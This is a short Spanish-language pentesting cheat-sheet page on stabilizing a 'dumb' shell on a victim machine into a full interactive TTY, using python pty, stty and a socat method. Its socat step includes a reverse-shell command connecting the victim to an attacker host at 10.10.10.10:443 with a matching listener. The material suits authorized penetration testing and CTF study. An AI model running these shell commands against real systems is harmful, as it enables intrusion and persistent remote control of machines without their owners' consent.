---
title: "TTY Stabilization (Interactive Shell)"
layout: "single"
category: "Shells"
slug: "shells/tty-stabilization"
date: "2025-11-26"
---

Si tienes una shell "tonta" (no funciona Ctrl+C, ni flechas, ni tabulador), sigue estos pasos **en orden exacto** para arreglarla.

### Método Python (El estándar)

1. **En la víctima (dentro de tu shell básica):**
   ```bash
   script /dev/null -c bash
   # O si tienes python:
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
   *(Pulsa Ctrl+Z para suspender la shell y volver a tu Kali)*

2. **En tu Kali:**
   ```bash
   stty raw -echo; fg
   ```
   *(Al pulsar Enter, volverás a la shell de la víctima. Escribe `reset` si se ve raro)*

3. **Configurar variables:**
   ```bash
   export TERM=xterm
   export SHELL=bash
   ```

4. **Ajustar tamaño (Para que nano/vim funcionen bien):**
   En otra terminal de tu Kali mira tu tamaño con `stty size`.
   En la víctima:
   ```bash
   stty rows <FILAS> columns <COLUMNAS>
   ```

### Método Socat (Shell perfecta)
Si puedes subir `socat` a la víctima, obtienes una TTY completa directamente.

**Atacante:**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:443
```

**Víctima:**
```bash
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:443
```
